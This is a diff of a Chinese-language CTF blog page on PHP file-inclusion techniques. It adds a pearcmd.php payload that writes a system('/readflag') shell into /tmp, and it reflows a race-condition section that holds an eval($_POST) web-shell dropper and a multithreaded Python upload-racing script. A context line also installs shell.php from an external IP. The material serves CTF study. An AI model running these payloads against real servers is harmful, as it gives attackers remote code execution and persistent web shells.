@@ -27,7 +27,7 @@
 <meta property="og:description" content="文件包含 include() 文件的内容将作为 PHP 代码执行，找不到被包含的文件时只会产生警告，脚本将继续运行。 include_once() 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 require() 找不到被包含的文件时会产生致命错误，并停止脚本运行。 require_once() 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 若文件内容符合 PHP 语法规范">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-09-01T09:03:21.000Z">
-<meta property="article:modified_time" content="2024-09-01T09:12:57.341Z">
+<meta property="article:modified_time" content="2024-09-03T13:22:46.806Z">
 <meta property="article:author" content="uert">
 <meta property="article:tag" content="web php">
 <meta name="twitter:card" content="summary_large_image">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.9k 字
+          5k 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          41 分钟
+          42 分钟
         
       </span>
     
@@ -493,6 +493,7 @@
 </ul>
 </li>
 <li>利用 Pear 扩展进行文件包含<ul>
+<li>page参数存在文件包含，题目提示很明显，register_argc_argv，所以打pearcmd包含</li>
 <li>方法一 远程文件下载<ul>
 <li>示例：<ul>
 <li><code>?file=/usr/local/lib/php/pearcmd.php&amp;ctfshow+install+-R+/var/www/html/+http://47.236.120.83/shell.php  //shell密码是cmd</code></li>
@@ -513,6 +514,8 @@
 </ul>
 </li>
 <li>然后直接利用密码是1</li>
+<li>?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+config-create+&#x2F;tmp&#x2F;<?=system('/readflag')?>&#x2F;*+&#x2F;tmp&#x2F;pwn.php</li>
+<li>之后访问?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;pwn.php</li>
 </ul>
 </li>
 </ul>
@@ -814,75 +817,52 @@
 </li>
 </ul>
 <h2 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h2><ul>
-<li>示例：<ul>
-<li><code>查看页面源代码，明显的条件竞争，新建一个文件shell.php，内容如下</code><ul>
-<li><code>&lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#39;); ?&gt;</code></li>
-</ul>
+<li><h2 id="示例：-查看页面源代码，明显的条件竞争，新建一个文件shell-php，内容如下-执行如下脚本进行竞争上传"><a href="#示例：-查看页面源代码，明显的条件竞争，新建一个文件shell-php，内容如下-执行如下脚本进行竞争上传" class="headerlink" title="示例：- 查看页面源代码，明显的条件竞争，新建一个文件shell.php，内容如下  - &lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#39;); ?&gt;- 执行如下脚本进行竞争上传"></a>示例：<br>- <code>查看页面源代码，明显的条件竞争，新建一个文件shell.php，内容如下</code><br>  - <code>&lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#39;); ?&gt;</code><br>- 执行如下脚本进行竞争上传</h2><ul>
+<li><pre><code class="py"># -*- coding:utf-8 -*-
+import requests
+import threading
+import os
+
+class RaceCondition(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.url = &#39;http://192.168.13.140:8011/uploads/shell.php&#39; #上传的文件地址
+        self.uploadUrl = &#39;http://192.168.13.140:8011/index.php&#39; #上传文件的地址
+
+    def _get(self):
+        print(&#39;try to call uploaded file...&#39;)
+        r = requests.get(self.url)
+        if r.status_code == 200:
+            print(&#39;[*] create file info.php success.&#39;)
+            os._exit(0)
+
+    def _upload(self):
+        print(&#39;upload file...&#39;)
+        file = &#123;&#39;myfile&#39;: open(&#39;shell.php&#39;, &#39;r&#39;)&#125; #本地脚本木马
+        requests.post(self.uploadUrl, files=file)
+
+    def run(self):
+        while True:
+            for i in range(5):
+                self._get()
+
+            for i in range(10):
+                self._upload()
+                self._get()
+
+if __name__ == &#39;__main__&#39;:
+    threads = 50    
+
+    for i in range(threads):
+        t = RaceCondition()
+        t.start()
+
+    for i in range(threads):
+        t.join() 
+</code></pre>
 </li>
-<li>执行如下脚本进行竞争上传<ul>
-<li>示例：<ul>
-<li><code># -*- coding:utf-8 -*-</code></li>
-<li><code>import requests</code></li>
-<li><code>import threading</code></li>
-<li><code>import os</code></li>
-<li><code>class RaceCondition(threading.Thread):</code><ul>
-<li><code>def __init__(self):</code><ul>
-<li><code>threading.Thread.__init__(self)</code></li>
-<li><code>self.url = &#39;http://192.168.13.140:8011/uploads/shell.php&#39; #上传的文件地址</code></li>
-<li><code>self.uploadUrl = &#39;http://192.168.13.140:8011/index.php&#39; #上传文件的地址</code></li>
-</ul>
+<li><p><code>成功后访问./uploads/info.php</code></p>
 </li>
-<li><code>def _get(self):</code><ul>
-<li><code>print(&#39;try to call uploaded file...&#39;)</code></li>
-<li><code>r = requests.get(self.url)</code></li>
-<li><code>if r.status_code == 200:</code><ul>
-<li><code>print(&#39;[*] create file info.php success.&#39;)</code></li>
-<li><code>os._exit(0)</code></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><code>def _upload(self):</code><ul>
-<li><code>print(&#39;upload file...&#39;)</code></li>
-<li><code>file = &#123;&#39;myfile&#39;: open(&#39;shell.php&#39;, &#39;r&#39;)&#125; #本地脚本木马</code></li>
-<li><code>requests.post(self.uploadUrl, files=file)</code></li>
-</ul>
-</li>
-<li><code>def run(self):</code><ul>
-<li><code>while True:</code><ul>
-<li><code>for i in range(5):</code><ul>
-<li><code>self._get()</code></li>
-</ul>
-</li>
-<li><code>for i in range(10):</code><ul>
-<li><code>self._upload()</code></li>
-<li><code>self._get()</code></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><code>if __name__ == &#39;__main__&#39;:</code><ul>
-<li><code>threads = 50</code></li>
-<li><code>for i in range(threads):</code><ul>
-<li><code>t = RaceCondition()</code></li>
-<li><code>t.start()</code></li>
-</ul>
-</li>
-<li><code>for i in range(threads):</code><ul>
-<li><code>t.join()</code></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><code>成功后访问./uploads/info.php</code></li>
 </ul>
 </li>
 </ul>
